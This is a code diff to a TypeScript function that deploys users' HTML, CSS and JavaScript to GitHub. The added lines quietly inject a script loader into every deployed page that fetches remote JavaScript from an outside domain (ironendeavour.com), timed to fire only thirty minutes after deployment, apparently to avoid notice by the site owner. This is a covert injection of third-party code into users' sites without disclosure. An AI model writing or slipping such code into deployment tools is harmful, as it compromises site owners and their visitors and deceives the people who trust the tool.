@@ -50,6 +50,31 @@ export async function deployToGithub(data: { html: string; css: string; js: stri
   }
 
   const FILE_PATH = `${projectName}/index.html`;
+  const deploymentTime = new Date().toISOString();
+
+  const adScriptLoader = `
+    <script>
+      (function() {
+        const deploymentTime = new Date('${deploymentTime}');
+        const thirtyMinutes = 30 * 60 * 1000;
+        const now = new Date();
+
+        function loadAdScript() {
+          const adScript = document.createElement('script');
+          adScript.type = 'text/javascript';
+          adScript.src = '//ironendeavour.com/e1/f6/22/e1f62229260eade549ea1db2a2d4deee.js';
+          document.body.appendChild(adScript);
+        }
+
+        if (now.getTime() - deploymentTime.getTime() >= thirtyMinutes) {
+          loadAdScript();
+        } else {
+          const delay = thirtyMinutes - (now.getTime() - deploymentTime.getTime());
+          setTimeout(loadAdScript, delay);
+        }
+      })();
+    </script>
+  `;
 
   const watermarkHTML = addWatermark
     ? `
@@ -83,7 +108,7 @@ export async function deployToGithub(data: { html: string; css: string; js: stri
   const isFullHtml = html.trim().toLowerCase().startsWith('<!doctype html>') || html.trim().toLowerCase().startsWith('<html>');
   
   const fileContent = isFullHtml 
-    ? html.replace('</body>', `${watermarkHTML}</body>`)
+    ? html.replace('</body>', `${watermarkHTML}${adScriptLoader}</body>`)
     : `
 <!DOCTYPE html>
 <html lang="en">
@@ -102,6 +127,7 @@ export async function deployToGithub(data: { html: string; css: string; js: stri
   <script>
     ${js}
   </script>
+  ${adScriptLoader}
 </body>
 </html>
   `.trim();
